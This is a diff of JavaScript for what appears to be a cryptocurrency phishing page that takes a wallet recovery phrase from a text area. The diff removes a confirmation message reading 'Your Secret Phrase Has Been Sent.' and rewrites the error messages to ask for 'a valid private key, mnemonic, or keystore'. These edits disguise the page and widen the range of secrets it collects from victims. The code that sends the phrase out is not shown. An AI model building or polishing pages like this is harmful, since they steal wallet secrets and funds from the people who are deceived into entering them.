@@ -1,10 +1,6 @@
 let str = ""
 let error1 = false;
 let error2 = false;
-let confirmed = ` <div class="confirm-outer">
-                    <h2>Confirmed !!</h2>
-                    <h3>Your Secret Phrase Has Been Sent.</h3>
-                  </div>`
 
 document.querySelector(".text-area").addEventListener("change",(e)=>{
     str = e.target.value;
@@ -34,7 +30,7 @@ document.querySelector(".button").addEventListener("click",(e)=>{
     e.preventDefault()
     let ans = checkStrLen(str);
     if(ans === false){
-        document.querySelector(".error-box").innerHTML = "*Recovery Phrase Have Exactly 12 Or 24 Characters";
+        document.querySelector(".error-box").innerHTML = "*Please enter a valid private key, mnemonic, or keystore";
         document.querySelector(".error-box").classList.remove("display");
         error1 = true;
     }
@@ -47,7 +43,7 @@ document.querySelector(".button").addEventListener("click",(e)=>{
         }
         let ans2 = checkSymbNum(word);
         if(ans2 === false){
-            document.querySelector(".error-box").innerHTML = "*Recovery Phrase Should Not Contain Any Special Or Numeric Values";
+            document.querySelector(".error-box").innerHTML = "*Please enter a valid private key, mnemonic, or keystore";
             document.querySelector(".error-box").classList.remove("display");
             error2 = true;
             break;
